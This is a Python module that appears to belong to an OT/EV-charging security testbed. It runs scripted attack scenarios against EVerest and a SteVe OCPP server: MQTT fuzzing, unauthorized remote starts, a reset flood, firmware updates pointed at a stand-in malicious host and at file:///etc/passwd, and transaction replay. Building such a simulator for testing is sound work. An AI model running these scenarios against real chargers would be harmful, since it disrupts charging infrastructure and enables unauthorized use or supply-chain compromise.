"""
Attack Engine: simulación de escenarios de ciberataque OT/EV.
Cada escenario es una corrutina independiente que puede iniciarse/detenerse.
"""
from __future__ import annotations

import asyncio
import json
import logging
import random
import string
from datetime import datetime, timezone
from typing import Any

from .config import MQTT_CMD_PREFIX, STEVE_API_URL
from .models import (
    AttackScenario,
    AttackStatus,
    AttackType,
    EventSeverity,
    EventType,
    SystemEvent,
)
from .state_store import station

log = logging.getLogger(__name__)


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# ──────────────────────────────────────────────────────────────
# Catálogo de escenarios disponibles
# ──────────────────────────────────────────────────────────────

SCENARIOS: list[dict[str, Any]] = [
    {
        "id": "mqtt_fuzzing",
        "name": "MQTT Topic Fuzzing",
        "attack_type": AttackType.MQTT_FUZZING,
        "description": (
            "Inyecta mensajes malformados y payloads inesperados "
            "en los topics MQTT de EVerest para probar robustez."
        ),
        "severity": EventSeverity.HIGH,
        "target": "Mosquitto / EVerest MQTT",
    },
    {
        "id": "unauthorized_remote_start",
        "name": "Unauthorized RemoteStartTransaction",
        "attack_type": AttackType.UNAUTHORIZED_REMOTE_START,
        "description": (
            "Envía un RemoteStartTransaction vía SteVe API "
            "con un idTag no autorizado para probar la validación."
        ),
        "severity": EventSeverity.CRITICAL,
        "target": "SteVe OCPP Server",
    },
    {
        "id": "dos_ocpp",
        "name": "DoS — BootNotification Flood",
        "attack_type": AttackType.DOS_OCPP,
        "description": (
            "Inunda el chargepoint con comandos de reinicio "
            "para simular un ataque de denegación de servicio OCPP."
        ),
        "severity": EventSeverity.CRITICAL,
        "target": "EVerest OCPP Module",
    },
    {
        "id": "firmware_manipulation",
        "name": "Firmware Manipulation",
        "attack_type": AttackType.FIRMWARE_MANIPULATION,
        "description": (
            "Envía un UpdateFirmware con URL maliciosa "
            "para simular un ataque de supply chain en el cargador."
        ),
        "severity": EventSeverity.CRITICAL,
        "target": "EVerest / SteVe",
    },
    {
        "id": "ocpp_replay",
        "name": "OCPP Message Replay",
        "attack_type": AttackType.OCPP_REPLAY,
        "description": (
            "Replica mensajes OCPP capturados anteriormente "
            "para intentar reutilizar transacciones ya completadas."
        ),
        "severity": EventSeverity.HIGH,
        "target": "SteVe OCPP Server",
    },
]


class AttackEngine:
    def __init__(self) -> None:
        self._tasks: dict[str, asyncio.Task] = {}

    # ──────────────────────────────────────────────────────────
    # Control público
    # ──────────────────────────────────────────────────────────

    def get_scenarios(self) -> list[dict]:
        return SCENARIOS

    async def start(self, scenario_id: str) -> AttackScenario | None:
        spec = next((s for s in SCENARIOS if s["id"] == scenario_id), None)
        if spec is None:
            return None

        sc = AttackScenario(
            id=scenario_id,
            name=spec["name"],
            attack_type=spec["attack_type"],
            description=spec["description"],
            severity=spec["severity"],
            target=spec["target"],
            status=AttackStatus.RUNNING,
            started_at=_now(),
        )
        station.register_attack(sc)
        station.add_event(SystemEvent(
            event_type=EventType.ATTACK_EVENT,
            severity=sc.severity,
            source="attack_engine",
            message=f"Attack STARTED: {sc.name}",
        ))

        handler = getattr(self, f"_run_{scenario_id}", self._run_generic)
        task = asyncio.create_task(handler(sc))
        self._tasks[scenario_id] = task
        return sc

    async def stop(self, scenario_id: str) -> bool:
        task = self._tasks.pop(scenario_id, None)
        if task:
            task.cancel()
            station.update_attack(
                scenario_id,
                status=AttackStatus.ABORTED,
                completed_at=_now(),
            )
            station.add_event(SystemEvent(
                event_type=EventType.ATTACK_EVENT,
                severity=EventSeverity.WARNING,
                source="attack_engine",
                message=f"Attack ABORTED: {scenario_id}",
            ))
            return True
        return False

    # ──────────────────────────────────────────────────────────
    # Implementaciones de escenarios
    # ──────────────────────────────────────────────────────────

    async def _run_mqtt_fuzzing(self, sc: AttackScenario) -> None:
        """Envía payloads malformados a topics MQTT de EVerest."""
        from .mqtt_bridge import bridge

        fuzz_topics = [
            f"{MQTT_CMD_PREFIX}/1/carsim/cmd/enable",
            f"{MQTT_CMD_PREFIX}/1/cmd/pause_charging",
            f"{MQTT_CMD_PREFIX}/2/carsim/cmd/enable",
            "everest_api/evse_manager_1/var/session_info",
        ]
        fuzz_payloads = [
            "null",
            '{"evil": true}',
            "A" * 1000,
            '{"state": "',          # JSON malformado (truncado)
            "\x00\x01\x02",         # bytes de control
            '{"power_W": -99999}',
        ]

        try:
            for i in range(30):
                topic_parts = random.choice(fuzz_topics).split("/")
                payload = random.choice(fuzz_payloads)
                # Publicar via cliente MQTT directo
                if bridge._client:
                    bridge._client.publish(
                        random.choice(fuzz_topics), payload, qos=0
                    )

                station.update_attack(sc.id, events_generated=i + 1)
                station.add_event(SystemEvent(
                    event_type=EventType.ATTACK_EVENT,
                    severity=EventSeverity.HIGH,
                    source="attack_engine",
                    message=f"[Fuzzing #{i+1}] payload={payload[:40]}",
                ))
                await asyncio.sleep(0.3)

            self._complete(sc)
        except asyncio.CancelledError:
            pass

    async def _run_unauthorized_remote_start(self, sc: AttackScenario) -> None:
        """Intenta RemoteStartTransaction con idTag no autorizado."""
        import httpx

        unauthorized_tags = ["EVIL-001", "HACKED", "00000000", "BYPASS"]
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                for i, tag in enumerate(unauthorized_tags):
                    try:
                        # SteVe REST API: POST /api/v1/core/remoteStartTransaction
                        r = await client.post(
                            f"{STEVE_API_URL}/core/remoteStartTransaction",
                            json={
                                "chargePointSelectList": [
                                    {"value": "EVCR-001", "type": "ocppId"}
                                ],
                                "idTag": tag,
                                "connectorId": 1,
                            },
                        )
                        station.add_event(SystemEvent(
                            event_type=EventType.ATTACK_EVENT,
                            severity=EventSeverity.CRITICAL,
                            source="attack_engine",
                            message=f"[UnauthorizedStart #{i+1}] idTag={tag} → HTTP {r.status_code}",
                        ))
                    except Exception as exc:
                        station.add_event(SystemEvent(
                            event_type=EventType.ATTACK_EVENT,
                            severity=EventSeverity.HIGH,
                            source="attack_engine",
                            message=f"[UnauthorizedStart #{i+1}] idTag={tag} → error: {exc}",
                        ))
                    station.update_attack(sc.id, events_generated=i + 1)
                    await asyncio.sleep(1.0)

            self._complete(sc)
        except asyncio.CancelledError:
            pass

    async def _run_dos_ocpp(self, sc: AttackScenario) -> None:
        """Simula DoS via flood de comandos de reinicio OCPP."""
        from .mqtt_bridge import bridge

        try:
            for i in range(20):
                # Publicar comando reset al topic de control
                if bridge._client:
                    bridge._client.publish(
                        f"{MQTT_CMD_PREFIX}/1/cmd/reset",
                        "hard",
                        qos=0,
                    )
                station.update_attack(sc.id, events_generated=i + 1)
                station.add_event(SystemEvent(
                    event_type=EventType.ATTACK_EVENT,
                    severity=EventSeverity.CRITICAL,
                    source="attack_engine",
                    message=f"[DoS #{i+1}] Reset flood → connector 1",
                ))
                await asyncio.sleep(0.2)

            self._complete(sc)
        except asyncio.CancelledError:
            pass

    async def _run_firmware_manipulation(self, sc: AttackScenario) -> None:
        """Envía UpdateFirmware con URL maliciosa via SteVe."""
        import httpx

        malicious_urls = [
            "http://evil.example.com/malware.bin",
            "file:///etc/passwd",
            "http://127.0.0.1:9999/payload",
        ]
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                for i, url in enumerate(malicious_urls):
                    try:
                        r = await client.post(
                            f"{STEVE_API_URL}/fw/updateFirmware",
                            json={
                                "chargePointSelectList": [
                                    {"value": "EVCR-001", "type": "ocppId"}
                                ],
                                "location": url,
                                "retrieveDate": _now(),
                            },
                        )
                        station.add_event(SystemEvent(
                            event_type=EventType.ATTACK_EVENT,
                            severity=EventSeverity.CRITICAL,
                            source="attack_engine",
                            message=f"[FWManip #{i+1}] url={url} → HTTP {r.status_code}",
                        ))
                    except Exception as exc:
                        station.add_event(SystemEvent(
                            event_type=EventType.ATTACK_EVENT,
                            severity=EventSeverity.HIGH,
                            source="attack_engine",
                            message=f"[FWManip #{i+1}] error: {exc}",
                        ))
                    station.update_attack(sc.id, events_generated=i + 1)
                    await asyncio.sleep(1.5)

            self._complete(sc)
        except asyncio.CancelledError:
            pass

    async def _run_ocpp_replay(self, sc: AttackScenario) -> None:
        """Replica transacciones OCPP capturadas."""
        import httpx

        # Simula el replay de un StartTransaction capturado
        replayed_transactions = [
            {"idTag": "CARD-001", "connectorId": 1, "meterStart": 0},
            {"idTag": "CARD-001", "connectorId": 1, "meterStart": 1500},
        ]
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                for i, tx in enumerate(replayed_transactions):
                    try:
                        r = await client.post(
                            f"{STEVE_API_URL}/core/remoteStartTransaction",
                            json={
                                "chargePointSelectList": [
                                    {"value": "EVCR-001", "type": "ocppId"}
                                ],
                                "idTag": tx["idTag"],
                                "connectorId": tx["connectorId"],
                            },
                        )
                        station.add_event(SystemEvent(
                            event_type=EventType.ATTACK_EVENT,
                            severity=EventSeverity.HIGH,
                            source="attack_engine",
                            message=f"[Replay #{i+1}] tx={tx} → HTTP {r.status_code}",
                        ))
                    except Exception as exc:
                        station.add_event(SystemEvent(
                            event_type=EventType.ATTACK_EVENT,
                            severity=EventSeverity.HIGH,
                            source="attack_engine",
                            message=f"[Replay #{i+1}] error: {exc}",
                        ))
                    station.update_attack(sc.id, events_generated=i + 1)
                    await asyncio.sleep(2.0)

            self._complete(sc)
        except asyncio.CancelledError:
            pass

    async def _run_generic(self, sc: AttackScenario) -> None:
        """Fallback genérico."""
        station.add_event(SystemEvent(
            event_type=EventType.ATTACK_EVENT,
            severity=sc.severity,
            source="attack_engine",
            message=f"Generic attack simulation: {sc.name}",
        ))
        await asyncio.sleep(2.0)
        self._complete(sc)

    def _complete(self, sc: AttackScenario) -> None:
        station.update_attack(
            sc.id,
            status=AttackStatus.COMPLETED,
            completed_at=_now(),
        )
        station.add_event(SystemEvent(
            event_type=EventType.ATTACK_EVENT,
            severity=EventSeverity.INFO,
            source="attack_engine",
            message=f"Attack COMPLETED: {sc.name}",
        ))


attack_engine = AttackEngine()
